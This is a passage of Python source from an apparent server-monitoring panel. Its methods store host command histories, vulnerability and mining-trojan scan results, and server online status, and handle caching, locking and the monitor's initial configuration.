        #             .name('process_network_io_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line) \
        #             .delete()
        #
        #     # 获取数据库管理对象
        #     db_mgr = monitor_db_manager.MonitorDbManager(sid)
        #
        #     # 写入数据
        #     if len(net_insert_data) > 0:
        #         db_mgr.add('process_network_io_info_list', net_insert_data, option='ignore')

        return ret_flag

    def store_command_history(self, sid, command_history):
        '''
            @name 将主机命令执行记录写入数据库
            @author Zhj<2022-09-28>
            @param  sid<integer>           主机ID
            @param  command_history<list>  命令执行记录
            @return void
        '''
        if self.running_dir_used_percent_high():
            return

        if isinstance(command_history, str):
            try:
                command_history = json.loads(command_history)
            except:
                return

        if len(command_history) < 1:
            return

        # 获取最近一次命令执行时间
        # latest_command_execute_time = self.__LATEST_COMMAND_EXECUTE_TIME.get(sid, None)

        # if latest_command_execute_time is None:
        #     latest_command_execute_time = self.db_easy('command_execute_logs')\
        #         .where('sid=?', sid)\
        #         .order('create_time', 'desc')\
        #         .value('create_time')
        #
        # if latest_command_execute_time is None:
        #     latest_command_execute_time = 0

        # 插入数据
        insert_data = []

        # 预编译正则表达式
        reg_obj = re.compile(r'^\d{10}$')

        # 本次最新的命令执行时间
        # cur_latest_execute_time = int(latest_command_execute_time)

        # 去重用的集合
        cmd_set = set()

        for exe_cmd in command_history:
            exe_time = exe_cmd.get('time', None)

            if exe_cmd.get('command', '') == '' \
                    or exe_time is None \
                    or not reg_obj.match(str(exe_time)) \
                    or '{}|{}'.format(exe_cmd['command'], exe_time) in cmd_set:
                # or int(latest_command_execute_time) > int(exe_time):
                continue

            # cur_latest_execute_time = max(cur_latest_execute_time, int(exe_time))

            insert_data.append({
                'sid': sid,
                'user': exe_cmd.get('user', ''),
                'command': exe_cmd.get('command', ''),
                'is_sensitive': self.is_sensitive_command(exe_cmd.get('command', '')),
                'create_time': int(exe_time),
            })

            # 添加进集合，用于检测去重
            cmd_set.add('{}|{}'.format(exe_cmd['command'], exe_time))

        # 批量插入数据
        if len(insert_data) > 0:
            with monitor_db_manager.db_mgr('command_execute_logs') as db:
                try:
                    # 关闭事务自动提交
                    db.autocommit(False)

                    # 设置非阻塞
                    db.set_blocking(False)

                    # 批量插入
                    db.query() \
                        .name('command_execute_logs') \
                        .insert_all(insert_data)

                    # 提交事务
                    db.commit()
                except BaseException as e:
                    # 回滚事务
                    db.rollback()

                    # 记录异常堆栈信息
                    public.print_exc_stack(e)

        # 更新最近一次命令执行时间
        # self.__LATEST_COMMAND_EXECUTE_TIME[sid] = cur_latest_execute_time

    def update_server_bugs(self, sid, bugs):
        '''
            @nmae 更新主机漏洞列表
            @author Zhj<2023-03-22>
            @param  sid<int>    主机ID
            @param  bugs<list>  漏洞列表
            @return bool
        '''
        if isinstance(bugs, str):
            try:
                bugs = json.loads(bugs)
            except:
                return False

        if not isinstance(bugs, list) or len(bugs) < 1:
            return False

        insert_data = {}

        cur_time = int(time.time())

        level_trans = {
            'low': 0,
            'mid': 1,
            'high': 2,
            'danger': 3,
        }

        for item in bugs:
            hash_id = public.mmh3_hash64('{}|{}'.format(sid, item['vuln_id']))
            insert_data[hash_id] = {
                'id': hash_id,
                'vuln_id': int(item['vuln_id']),
                'usable': int(item['vuln_status']),
                'status': 0,
                'ignore_operator': 0,
                'ignore_time': 0,
                'handle_operator': 0,
                'handled_time': 0,
                'create_time': item.get('update_time', cur_time),
                'update_time': item.get('update_time', cur_time),
                'level': level_trans.get(str(item['level']).lower(), 1),
                'cve_id': item['cve_id'],
                'type': item['type'],
                'vuln_name': item['vuln_name'],
                'soft_source': item['soft_source'],
                'soft_name': item['soft_name'],
                'soft_version': item.get('local_version', '') if item['soft_source'] != 'file' else '',
                'file_path': item.get('local_version', '') if item['soft_source'] == 'file' else '',
                'tag': json.dumps(item['tag'], ensure_ascii=False),
                'ps': item['ps'],
                'suggestions': item['suggest'],
                'fix_remark': '',
            }

        with monitor_db_manager.MonitorDbManager(sid).db_mgr('server_bugs') as db_1, monitor_db_manager.db_mgr(
                'server_bug_total') as db_2:
            exists_data = db_1.query().name('server_bugs').where_in('id', insert_data.keys()).field('*').column(None,
                                                                                                                'id')
            for k in exists_data.keys():
                insert_data[k].pop('status')
                insert_data[k].pop('ignore_operator')
                insert_data[k].pop('ignore_time')
                insert_data[k].pop('handle_operator')
                insert_data[k].pop('handled_time')
                insert_data[k].pop('fix_remark')
                insert_data[k].pop('create_time')
                exists_data[k].update(insert_data[k])
                insert_data[k] = exists_data[k]

            db_1.query().name('server_bugs').insert_all(list(insert_data.values()), option='replace')

            # 漏洞等级数量  .where_in('status', [0,2]) \
            #
            level_num = db_1.query().name('server_bugs') \
                .where('usable', 1) \
                .where_not_in('status', [1]) \
                .field(
                'SUM(`level`=0) AS `level_0`',
                'SUM(`level`=1) AS `level_1`',
                'SUM(`level`=2) AS `level_2`',
                'SUM(`level`=3) AS `level_3`',)\
                .find()

            db_2.query().name('server_bug_total').insert({
                'sid': sid,
                'bugs': db_1.query().name('server_bugs').count(),
                'ignored': db_1.query().name('server_bugs').where('status', 1).count(),
                'handled': db_1.query().name('server_bugs').where('status', 2).count(),
                'fixed': db_1.query().name('server_bugs').where_not_in('status', [1]).where('usable', 0).count(),
                'last_scan_time': cur_time,
                'level_0': level_num['level_0'],
                'level_1': level_num['level_1'],
                'level_2': level_num['level_2'],
                'level_3': level_num['level_3'],
            }, option='replace')

        from core.include.monitor_helpers import warning_obj
        warning_obj.warn_assign(sid, 'safety', 'bug', 'percent', bugs)


        return True

    def update_server_minings(self, sid, minings):
        '''
            @nmae 更新主机挖矿木马列表
            @author Zhj<2023-03-28>
            @param  sid<int>        主机ID
            @param  minings<list>   挖矿木马列表
            @return bool
        '''
        if isinstance(minings, str):
            try:
                bugs = json.loads(minings)
            except:
                return False

        if not isinstance(minings, list) or len(minings) < 1:
            return False

        insert_data = {}

        cur_time = int(time.time())

        for item in minings:
            hash_id = public.mmh3_hash64('{}|{}'.format(sid, item['vuln_id']))
            insert_data[hash_id] = {
                'id': hash_id,
                'vuln_id': item['vuln_id'],
                'usable': int(item['vuln_status']),
                'status': 0,
                'ignore_operator': 0,
                'ignore_time': 0,
                'handle_operator': 0,
                'handled_time': 0,
                'create_time': item.get('update_time', cur_time),
                'update_time': item.get('update_time', cur_time),
                'type': item['soft_name'],
                'title': item['system_name'],
                'ps': item['ps'],
                'suggestions': item['suggest'],
                'fix_remark': '',
                'process_info': json.dumps(item['process']),
            }

        with monitor_db_manager.MonitorDbManager(sid).db_mgr('server_minings') as db_1, monitor_db_manager.db_mgr(
                'server_mining_total') as db_2:
            ks = insert_data.keys()
            exists_data = db_1.query().name('server_minings').where_in('id', ks).field('*').column(None, 'id')
            for k in exists_data.keys():
                insert_data[k].pop('status')
                insert_data[k].pop('ignore_operator')
                insert_data[k].pop('ignore_time')
                insert_data[k].pop('handle_operator')
                insert_data[k].pop('handled_time')
                insert_data[k].pop('fix_remark')
                insert_data[k].pop('create_time')
                exists_data[k].update(insert_data[k])
                insert_data[k] = exists_data[k]

            db_1.autocommit(False)
            db_1.query().name('server_minings').insert_all(list(insert_data.values()), option='replace')
            db_1.query().name('server_minings').where_not_in('id', ks).update({'usable': 0})
            db_1.commit()

            db_2.query().name('server_mining_total').insert({
                'sid': sid,
                'minings': db_1.query().name('server_minings').count(),
                'ignored': db_1.query().name('server_minings').where('status', 1).count(),
                'handled': db_1.query().name('server_minings').where('status', 2).count(),
                'fixed': db_1.query().name('server_minings').where_not_in('status', [1]).where('usable', 0).count(),
                'last_scan_time': cur_time,
            }, option='replace')

        from core.include.monitor_helpers import warning_obj
        warning_obj.warn_assign(sid, 'safety', 'mining', 'percent', minings)

        return True

    def update_servers(self, sid=None, heartbeat=False, remote_addr=None):
        '''
            @name   更新主机状态
            @author Zhj<2022-06-29>
            @param  sid<integer>    主机ID
            @param  heartbeat<bool> 是否来自心跳包
            @return bool
        '''
        ret_flag = True

        # 获取当前时间
        cur_time = int(time.time())

        warn_list = []

        # 接收到主机心跳包
        if heartbeat:
            cache_data = self.cache_server_status(sid)

            # 存在缓存则从缓存读取信息
            if cache_data:
                last_heartbeat_time, remote_addr, server_status = cache_data

                # public.print_log("心跳包----------{} {} {} {}".format(server_status, cur_time, last_heartbeat_time, cur_time - int(last_heartbeat_time)))

                # 仅当主机状态发生改变时，更新主机状态
                if int(server_status) == 0:
                    server_info = self.db_easy('servers')\
                        .where('sid', sid)\
                        .where('is_authorized', 1) \
                        .field('sid', 'ip', 'remark', 'status', 'last_active_time', 'is_authorized')\
                        .find()

                    if server_info is None:
                        return

                    # public.print_log("心跳包上次时间----------{}".format(server_info['last_active_time']))
                    update_data = {}

                    # 更新主机IP
                    if remote_addr is not None \
                            and remote_addr != '' \
                            and remote_addr != server_info['ip'] \
                            and public.check_ip(remote_addr):
                        update_data['ip'] = remote_addr

                    # 当主机上线时，更新最近一次活动时间
                    if server_status == 1:
                        update_data['last_active_time'] = cur_time

                    if int(server_info['is_authorized']) == 1:
                        warn_list.append({
                            'sid': server_info['sid'],
                            'server_status': 1,
                            'desc': '主机【{}{}】已上线'.format(
                                server_info['ip'],
                                '' if server_info['remark'] == '' else '({})'.format(server_info['remark']))
                        })

                    # 更新数据
                    update_data['status'] = 1
                    update_data['update_time'] = cur_time
                    self.db_easy('servers') \
                        .where('sid', sid) \
                        .update(update_data)

            # 更新主机状态缓存
            self.cache_server_status(sid, server_status=1, remote_addr=remote_addr)
            # public.cache_set('SHM_:BT_MONITOR_SERVER_LAST_HEARTBEAT_TIME_{}'.format(sid), (cur_time, remote_addr, 1))

        # 非主机心跳包情况，更新所有主机状态
        if not heartbeat:
            # 打开数据库
            with monitor_db_manager.db_mgr() as db:
                try:
                    # 获取已授权主机
                    query = db.query() \
                        .name('servers') \
                        .where('is_authorized', 1) \
                        .field('sid', 'ip', 'remark', 'status', 'last_active_time', 'is_authorized')

                    if sid is not None:
                        query.where('sid', sid)

                    servers = query.select()

                    # public.print_log("+++++++query**************{}".format(servers))

                    if servers is None or len(servers) < 1:
                        raise BtMonitorException('无可更新的主机')

                    # 关闭自动提交事务
                    db.autocommit(False)

                    # 设置非阻塞
                    db.set_blocking(False)

                    for server_info in servers:
                        # cache_key = 'SHM_:BT_MONITOR_SERVER_LAST_HEARTBEAT_TIME_{}'.format(server_info['sid'])

                        # 尝试读取缓存
                        # cache_data = public.cache_get(cache_key)
                        cache_data = self.cache_server_status(server_info['sid'])

                        # 上一次心跳包时间
                        last_heartbeat_time = int(server_info['last_active_time'])

                        # 主机IP
                        remote_addr = server_info['ip']

                        # 主机状态
                        server_status = int(server_info['status'])

                        # 存在缓存则从缓存读取信息
                        if cache_data:
                            last_heartbeat_time, remote_addr, server_status = cache_data

                        # 更新数据
                        update_data = {}

                        # 更新主机IP
                        if remote_addr is not None \
                                and remote_addr != '' \
                                and remote_addr != server_info['ip'] \
                                and public.check_ip(remote_addr):
                            update_data['ip'] = remote_addr

                        # 从上一次心跳包到现在超过5分钟则判定为离线
                        cur_server_status = 1 if (cur_time - int(last_heartbeat_time)) < 100 else 0

                        # 仅当主机状态发生改变时，更新主机状态
                        if int(server_status) != int(cur_server_status):
                            # 更新缓存
                            # public.cache_set(cache_key, (last_heartbeat_time, remote_addr, cur_server_status))
                            self.cache_server_status(server_info['sid'], server_status=cur_server_status, remote_addr=remote_addr)

                            # 当主机上线时，更新最近一次活动时间
                            if server_status == 1:
                                update_data['last_active_time'] = cur_time

                            if int(server_info['is_authorized']) == 1:
                                warn_list.append({
                                    'sid': server_info['sid'],
                                    'server_status': cur_server_status,
                                    'desc': '主机【{}{}】已下线'.format(
                                        server_info['ip'],
                                        '' if server_info['remark'] == '' else '({})'.format(server_info['remark']))
                                })

                        # 更新数据
                        update_data['status'] = cur_server_status
                        update_data['update_time'] = cur_time
                        db.query() \
                            .name('servers') \
                            .where('sid', server_info['sid']) \
                            .update(update_data)

                    # 提交事务
                    db.commit()
                except BaseException as e:
                    # 回滚事务
                    db.rollback()

                    ret_flag = False

                    # 记录异常堆栈
                    public.print_exc_stack(e)

        # 写系统日志和告警
        if len(warn_list) > 0:
            # public.print_log("warn_list------{}".format(len(warn_list)))
            # public.print_log("warn_list------{}".format(warn_list))

            for warn_info in warn_list:
                # 写一条系统日志
                public.WriteLog('主机管理', warn_info['desc'])

                # 主机上下线告警
                self.warn_server_status_on_off(warn_info['sid'], warn_info['server_status'])

        return ret_flag

    # 更新进程名称与启动路径
    def update_process_name_exe(self):
        """
            @name 更新进程名称与启动路径
            @author Zhj<2023-06-21>
            @return None
        """
        # public.print_log('>>>>>> update_process_name_exe: {}'.format(self.__PROCESS_NAME_EXE_QUEUE.qsize()), _level='error')

        d = {}

        try:
            while True:
                item = self.__PROCESS_NAME_EXE_QUEUE.get(False)
                for row in item:
                    d[row['id']] = row
        except queue.Empty:
            pass

        if len(d.keys()) > 0:
            self.db_easy('process_name_exe').insert_all(list(d.values()), option='replace', blocking=False)

    def retrieve_server_detail(self, sid):
        '''
            @name 查询主机资源信息
            @author Zhj<2022-07-12>
            @param  sid<integer> 主机ID
            @return (主机资源信息或False<dict|bool>, err_msg<string>)
        '''
        # if not self.server_is_online(sid):
        #     return False, '主机已离线'

        # 获取主机信息
        server_detail = self.cache_realtime_server_info(sid)

        if self.is_empty_result(server_detail):
            return False, '获取主机信息失败'

        return server_detail, ''

    def the_project_is_initialized(self):
        '''
            @name 检查云监控是否已完成初始化操作
            @author Zhj<2022-07-23>
            @return bool
        '''
        return public.cache_get(self.__INITIALIZED_CACHE_KEY) or os.path.exists(self.__INITIALIZED_FILENAME)

    # 初始化云监控
    def init_cloud_monitor(self):
        if self.the_project_is_initialized():
            return

        # 上锁
        with Locker.acquire_with_file(timeout=600):
            if self.the_project_is_initialized():
                return

            s_time = time.time()
            public.print_log('--正在初始化云监控--', _level='error')
            try:
                public.print_log('--正在初始化配置--', _level='error')
                s_time_tmp = s_time
                # 初始化配置
                self.__init_config()
                e_time_tmp = time.time()
                public.print_log('--配置初始化完成-- 耗时：{}秒'.format(e_time_tmp - s_time_tmp), _level='error')

                public.print_log('--正在初始化数据库--', _level='error')
                s_time_tmp = e_time_tmp
                # 创建数据表
                self.__init_tables()
                e_time_tmp = time.time()
                public.print_log('--数据库初始化完成-- 耗时：{}秒'.format(e_time_tmp - s_time_tmp), _level='error')

                public.print_log('--正在初始化计划任务--', _level='error')
                s_time_tmp = e_time_tmp
                # 创建计划任务
                self.__create_tasks()
                e_time_tmp = time.time()
                public.print_log('--计划任务初始化完成-- 耗时：{}秒'.format(e_time_tmp - s_time_tmp), _level='error')

                # 标记初始化完成
                self.__set_the_project_initialized()

                public.print_log('--云监控初始化完成-- 耗时：{}秒'.format(time.time() - s_time_tmp), _level='error')
            except BaseException as e:
                public.print_log('--云监控初始化失败--', _level='error')

                # 记录异常堆栈
                public.print_exc_stack(e)

    def __set_the_project_initialized(self):
        '''
            @name 标记云监控已初始化成功
            @author Zhj<2022-07-23>
            @return void
        '''
        public.WriteFile(self.__INITIALIZED_FILENAME, '')
        public.cache_set(self.__INITIALIZED_CACHE_KEY, 1)

    def __init_tables(self):
        '''
            创建数据表
            @author Zhj<2022-06-23>
        '''
        # safety数据表
        monitor_db_manager._init_safety_db()

        # monitor_mgr数据库
        monitor_db_manager._init_mgr_db()
        monitor_db_manager._init_single_db()

    def __create_tasks(self):
        '''
            @name 添加计划任务列表
            @author Zhj<2022-07-21>
        '''
        cron_task_obj = cron_task.main()

        # 每隔1分钟更新服务器列表状态
        # cron_task_obj.delete_task('update_servers')
        # cron_task_obj.create_task('update_servers', {
        #     'type': 'minute-n',
        #     'where1': 1,
        # })

        # 每隔2分钟扫描告警规则
        # cron_task_obj.delete_task('warn_task')
        # cron_task_obj.create_task('warn_task', {
        #     'type': 'minute-n',
        #     'where1': 2,
        # })

        # 每天00:00:00上报统计数据
        cron_task_obj.delete_task('report_task')
        cron_task_obj.create_task('report_task', {
            'type': 'day-n',
            'hour': 0,
            'minute': 0,
            'where1': 1,
        })

        # 每隔2分钟测试端口连接
        # cron_task_obj.delete_task('port_test_task')
        # cron_task_obj.create_task('port_test_task', {
        #     'type': 'minute-n',
        #     'where1': 2,
        # })

        # 每天02:00:00归档数据库文件
        cron_task_obj.delete_task('database_archive')
        cron_task_obj.create_task('database_archive', {
            'type': 'day-n',
            'hour': 2,
            'minute': 0,
            'where1': 1,
        })

        # 每天02:00:00归档请求日志
        cron_task_obj.delete_task('request_log_archive')
        cron_task_obj.create_task('request_log_archive', {
            'type': 'day-n',
            'hour': 2,
            'minute': 0,
            'where1': 1,
        })

    def __init_config(self):
        '''
            @name 初始化配置
            @author Zhj<2022-07-23>
            @return void
        '''
        # 初始化配置文件
        public.save_config('config', {
            'API': {
                'encrypt': True,
                'open': True
            },
            'home': 'https://www.bt.cn',
            'admin_path': '/{}'.format(public.md5(public.GetRandomString(16))[:9]),
            'accept_ip': [],
            'accept_domain': '',
            'debug': False,
            'session_timeout': 86400,
            'password_expire': 180,
            'port': 806,
            'not_login_modules': ['plugin', 'api'],
            'not_login_uri': ['/user/login', '/user/check_two_auth_login'],
        })

        # 初始化rbac配置文件
        public.save_config('rbac', {
            'USER_AUTH_ON': True,
            'USER_AUTH_TYPE': 2,
            'ADMIN_AUTH_KEY': 1,
            'USER_AUTH_KEY': 'uid',
            'REQUIRE_AUTH_MODULE': [],
            'NOT_AUTH_MODULE': ["user", "auth", "test", "plugin", "api"],
            'REQUIRE_AUTH_ACTION': [],
            'NOT_AUTH_ACTION': [],
            'RBAC_ROLE_TABLE': 'bt_role',
            'RBAC_USER_TABLE': 'bt_role_user',
            'RBAC_ACCESS_TABLE': 'bt_access',
            'RBAC_NODE_TABLE': 'bt_node',
        })

        # 初始化basic_auth配置文件
        public.save_config('basic_auth', {
            'open': False,
        })

        # 初始化page配置文件
        public.save_config('page', {
            'PREV': '上一页',
            'NEXT': '下一页',
            'START': '首页',
            'END': '尾页',
            'COUNT_START': '共',
            'COUNT_END': '条',
            'FO': '从',
            'LINE': '条',
        })

        # 初始化status_code配置文件
        public.save_config('status_code', {
            '1': [True, '{}成功!'],
            '-1': [False, '{}失败!'],
            '1000': [False, '{}'],
            '1001': [False, '缺少必要参数: {}'],
            '1002': [False, '错误的参数格式: {}'],
            '1003': [False, '指定模块{}不存在!'],
            '1004': [False, '在指定模块中没有找到{}方法!'],
        })

    def lock(self, lock_key, max_wait_millisec=2500):
        '''
            @name 上锁
            @author Zhj<2022-07-04>
            @param  lock_key<string>            锁名称
            @param  max_wait_millisec<integer>  最长锁等待时间/毫秒[可选 默认2500毫秒]
            @return bool
        '''
        lock_key = 'BT_MONITOR_LOCKER__' + lock_key
        total_milliseconds = 0
        while public.cache_get(lock_key):
            if total_milliseconds > max_wait_millisec:
                return False

            total_milliseconds += 5
            time.sleep(0.005)

        public.cache_set(lock_key, 1, 3)
        return True

    def unlock(self, lock_key):
        '''
            @name 释放锁
            @author Zhj<2022-07-04>
            @param  lock_key:
            @return bool
        '''
        public.cache_remove('BT_MONITOR_LOCKER__' + lock_key)
        return True

    @contextmanager
    def acquire(self, lock_key, max_wait_millisec=2500):
        '''
            @name 基于上下文管理器的锁
            @author Zhj<2022-09-07>
            @param  lock_key<string>            锁名称
            @param  max_wait_millisec<integer>  最长锁等待时间/毫秒[可选 默认2500毫秒]
            @return generator
        '''
        try:
            # 上锁
            self.lock(lock_key, max_wait_millisec)
            yield
        finally:
            # 释放锁
            self.unlock(lock_key)

    def is_empty_result(self, res):
        '''
            @name 检查查询结果是否为空
            @author Zhj<2022-07-04>
            @param  res<None|list|dict> 查询结果
            @return bool
        '''
        if res is None or isinstance(res, str):
            return True

        if isinstance(res, list) and len(res) == 0:
            return True

        if isinstance(res, dict) and len(res.keys()) == 0:
            return True

        return False

    def db(self, table_name=None):
        '''、
            @deprecate 不再使用此函数
            @name 获取sqlite查询对象
            @param table_name<string> 表名[可选]
            @return sqlite.Sql
        '''
        sqlite_obj = sqlite.Sql().dbfile(self.__DB_FILE)

        if table_name is not None:
            sqlite_obj.table(table_name)

        return sqlite_obj

    def db_easy(self, table_name=None, db_path=None):
        '''
            @name 获取SqliteEasy查询构造器对象
            @author Zhj<2022-07-18>
            @param  table_name<?string> 表名[可选]
            @param  db_path<?string>    数据库路径[可选]
            @return core.include.sqlite_easy.SqliteEasy
        '''
        # 清理无效数据库连接
        self.__clear_invalid_db()

        cur_time = int(time.time())

        db = None

        if db_path is not None:
            if db_path not in self.__DB_DICT:
                with Locker.acquire(self.__DB_DICT_UPDATE_LOCK, timeout=5):
                    if db_path not in self.__DB_DICT:
                        self.__DB_DICT[db_path] = (monitor_db_manager.db_mgr(db_path), cur_time)

            db, _ = self.__DB_DICT.get(db_path, (None, None))

        if db is None and table_name is not None:
            # 获取表名
            m = self.__MATCH_TABLE_NAME_REGEXP.match(table_name)

            if m is None:
                raise Exception('表名格式错误: {}'.format(table_name))

            if m.group(1) not in self.__DB_DICT:
                with Locker.acquire(self.__DB_DICT_UPDATE_LOCK, timeout=5):
                    if m.group(1) not in self.__DB_DICT and monitor_db_manager.is_single_db(m.group(1)):
                        self.__DB_DICT[m.group(1)] = (monitor_db_manager.db_mgr(m.group(1)), cur_time)

            db, _ = self.__DB_DICT.get(m.group(1), (None, None))

        if db is None:
            if self.__DB_FILE not in self.__DB_DICT:
                with Locker.acquire(self.__DB_DICT_UPDATE_LOCK, timeout=5):
                    if self.__DB_FILE not in self.__DB_DICT:
                        self.__DB_DICT[self.__DB_FILE] = (public.sqlite_easy(self.__DB_FILE), cur_time)

            db, _ = self.__DB_DICT.get(self.__DB_FILE, (None, None))

        # 开启自动提交事务
        query = db.autocommit().query()

        if table_name is not None:
            query.name(table_name)

        return query

    def db_memory(self, table_name=None):
        '''
            @name 连接内存数据库
            @author Zhj<2022-09-17>
            @param  table_name<?string> 表名[可选]
            @return core.include.sqlite_easy.SqliteEasy
        '''
        query = self.__DB_MEMORY\
            .connect()\
            .query()

        if table_name is not None:
            query.name(table_name)

        return query

    def cache_server_command_history(self, sid, command_history=None):
        '''
            @name   缓存主机命令执行记录
            @author Zhj<2022-07-12>
            @param  sid<integer>            主机ID
            @param  command_history<?list>   命令执行记录
            @return list
        '''
        # 缓存键名
        cache_key = 'BT_MONITOR_CACHE_SERVER_COMMAND_HISTORY__' + str(sid)

        cache_data = public.cache_get(cache_key)

        default_cache_data = []

        if not cache_data:
            cache_data = default_cache_data
        else:
            try:
                cache_data = json.loads(cache_data)
            except:
                cache_data = default_cache_data

        # 获取缓存
        if command_history is None:
            return cache_data

        # 写入缓存
        public.cache_set(cache_key, json.dumps(command_history), 240)

        return command_history

    def cache_server_installed_softs(self, sid, install_softs=None):
        '''
            @name   缓存主机软件安装列表
            @author Zhj<2022-07-12>
            @param  sid<integer>           主机ID
            @param  install_softs<?list>   软件安装列表
            @return list
        '''
        # 缓存键名
        cache_key = 'BT_MONITOR_CACHE_SERVER_INSTALLED_SOFTS__' + str(sid)

        cache_data = public.cache_get(cache_key)

        default_cache_data = []

        if not cache_data:
            cache_data = default_cache_data
        else:
            try:
                cache_data = json.loads(cache_data)
            except:
                cache_data = default_cache_data

        # 获取缓存
        if install_softs is None:
            return cache_data

        # 写入缓存
        public.cache_set(cache_key, json.dumps(install_softs), 240)

        return install_softs

    def cache_server_ssh_users(self, sid, ssh_users=None):
        '''
            @name   缓存主机SSH在线用户列表
            @author Zhj<2022-07-12>
            @param  sid<integer>       主机ID
            @param  ssh_users<?list>   SSH在线用户列表
            @return list
        '''
        # 缓存键名
        cache_key = 'BT_MONITOR_CACHE_SERVER_SSH_USERS__' + str(sid)

        cache_data = public.cache_get(cache_key)

        default_cache_data = []

        if not cache_data:
            cache_data = default_cache_data
        else:
            try:
                cache_data = json.loads(cache_data)
            except:
                cache_data = default_cache_data

        # 获取缓存
        if ssh_users is None:
            return cache_data

        # 写入缓存
        public.cache_set(cache_key, json.dumps(ssh_users), 240)

        return ssh_users

    def cache_server_syslog_paths(self, sid, syslog_paths=None):
        '''
            @name   缓存主机SSH在线用户列表
            @author Zhj<2022-07-12>
            @param  sid<integer>          主机ID
            @param  syslog_paths<?list>   系统日志路径列表
            @return list
        '''
        # 缓存键名
        cache_key = 'BT_MONITOR_CACHE_SERVER_SYSLOG_PATHS__' + str(sid)

        cache_data = public.cache_get(cache_key)

        default_cache_data = []

        if not cache_data:
            cache_data = default_cache_data
        else:
            try:
                cache_data = json.loads(cache_data)
            except:
                cache_data = default_cache_data

        # 获取缓存
        if syslog_paths is None:
            return cache_data

        # 写入缓存
        public.cache_set(cache_key, json.dumps(syslog_paths), 240)

        return syslog_paths

    def cache_realtime_proc_info(self,
                                 process_id,
                                 cpu_percent=None,
                                 mem_percent=None,
                                 mem_used=None,
                                 disk_read_per_second=None,
                                 disk_write_per_second=None,
                                 net_sent_per_second=None,
                                 net_recv_per_second=None):
        '''
            @name 将进程实时数据写入缓存
            @author Zhj<2022-07-06>
            @param  process_id<integer>             进程表ID
            @param  cpu_percent<float>              CPU使用率
            @param  mem_percent<float>              内存使用率
            @param  mem_used<integer>               已占用内存
            @param  disk_read_per_second<integer>   磁盘每秒读取字节数
            @param  disk_write_per_second<integer>  磁盘每秒写入字节数
            @param  net_sent_per_second<integer>    网络每秒发送字节数
            @param  net_recv_per_second<integer>    网络每秒接收字节数
            @return dict
        '''
        cache_key = 'BT_MONITOR_CACHE__REALTIME_PROC_INFO_{}'.format(process_id)
        # public.print_log("Cache key: {}".format(cache_key))

        # 获取缓存
        cache_data = public.cache_get(cache_key)
        # public.print_log("cahce data:")
        # public.print_log(cache_data)

        default_cache_data = {
            'cpu_percent': 0,
            'mem_percent': 0,
            'mem_used': 0,
            'disk_read_per_second': 0,
            'disk_write_per_second': 0,
            'net_sent_per_second': 0,
            'net_recv_per_second': 0,
        }

        if not cache_data:
            cache_data = default_cache_data
        else:
            try:
                cache_data = json.loads(cache_data)
            except:
                # public.print_log("exception:")
                # public.print_log(cache_data)
                cache_data = default_cache_data

        # 只传了process_id时为获取进程实时信息
        if cpu_percent is None \
                and mem_percent is None \
                and mem_used is None \
                and disk_read_per_second is None \
                and disk_write_per_second is None \
                and net_sent_per_second is None \
                and net_recv_per_second is None:
            return cache_data

        if cpu_percent is not None:
            cache_data['cpu_percent'] = cpu_percent

        if mem_percent is not None:
            cache_data['mem_percent'] = mem_percent

        if mem_used is not None:
            cache_data['mem_used'] = mem_used

        if disk_read_per_second is not None:
            cache_data['disk_read_per_second'] = disk_read_per_second

        if disk_write_per_second is not None:
            cache_data['disk_write_per_second'] = disk_write_per_second

        if net_sent_per_second is not None:
            cache_data['net_sent_per_second'] = net_sent_per_second
            # public.print_log("{}/ sent: {}".format(process_id, net_sent_per_second))

        if net_recv_per_second is not None:
            cache_data['net_recv_per_second'] = net_recv_per_second
            # public.print_log("{}/recv: {}".format(process_id, net_recv_per_second))

        # 重新写入缓存
        public.cache_set(cache_key, json.dumps(cache_data), 120)

        return cache_data

    def cache_realtime_server_info(self,
                                   sid,
                                   host_info=None,
                                   cpu_info=None,
                                   mem_info=None,
                                   disk_info=None,
                                   net_info=None,
                                   load_avg=None):
        '''
            @name  缓存主机实时信息
            @author Zhj<2022-07-15>
            @param sid<integer> 主机ID
            @param host_info<dict>  主机信息
            @param cpu_info<dict>   CPU信息
            @param mem_info<dict>   内存信息
            @param disk_info<list>  磁盘信息
            @param net_info<list>   网卡信息
            @param load_avg<dict>   负载信息
            @return dict
        '''
        cache_key = 'SHM_:BT_MONITOR_CACHE_REALTIME_SERVER_INFO__{}'.format(str(sid))

        cached_data = public.cache_get(cache_key)

        if cached_data:
            try:
                cached_data = json.loads(cached_data)
            except:
                cached_data = None
        else:
            cached_data = None

        if cached_data is None:
            # 从数据库获取
            res_db = self.db_easy('server_details') \
                .where('sid', int(sid)) \
                .field(
                    'sid',
                    'host_info',
                    'cpu_info',
                    'mem_info',
                    'disk_info',
                    'net_info',
                    'load_avg'
                ).find()

            if self.is_empty_result(res_db):
                cached_data = {}
            else:
                cached_data = {
                    'host_info': json.loads(res_db.get('host_info', '{}')),
                    'cpu_info': json.loads(res_db.get('cpu_info', '{}')),
                    'mem_info': json.loads(res_db.get('mem_info', '{}')),
                    'disk_info': json.loads(res_db.get('disk_info', '[]')),
                    'net_info': json.loads(res_db.get('net_info', '[]')),
                    'load_avg': json.loads(res_db.get('load_avg', '{}')),
                }

        # 获取缓存
        if host_info is None \
                and cpu_info is None \
                and mem_info is None \
                and disk_info is None \
                and net_info is None \
                and load_avg is None:
            return cached_data

        if host_info is not None:
            cached_data['host_info'] = host_info

        if cpu_info is not None:
            cached_data['cpu_info'] = cpu_info

        if mem_info is not None:
            cached_data['mem_info'] = mem_info

        if disk_info is not None:
            cached_data['disk_info'] = disk_info

        if net_info is not None:
            cached_data['net_info'] = net_info

        if load_avg is not None:
            cached_data['load_avg'] = load_avg

        # 写入缓存
        public.cache_set(cache_key, json.dumps(cached_data), 120)

        return cached_data

    def cache_server_status(self, sid, server_status=None, remote_addr=None):
        '''
            @name 缓存主机状态
            @author Zhj<2023-03-10>
            @param sid<int>                 主机ID
            @param server_status<?int>      主机状态 0-离线 1-在线
            @param remote_addr<?string>     主机IP
            @return (上一次心跳时间, 主机IP, 主机状态)
        '''
        cache_key = 'SHM_:BT_MONITOR_SERVER_LAST_HEARTBEAT_TIME_{}'.format(sid)

        cur_time = int(time.time())

        cached_data = public.cache_get(cache_key)

        # 没有缓存时，从数据库读取
        if not cached_data:
            server_info = self.db_easy('servers')\
                .where('sid', sid)\
                .field('sid', 'ip', 'status', 'last_active_time', 'is_authorized')\
                .find()
            if not server_info:
                cached_data = (0, '', 0)
            else:
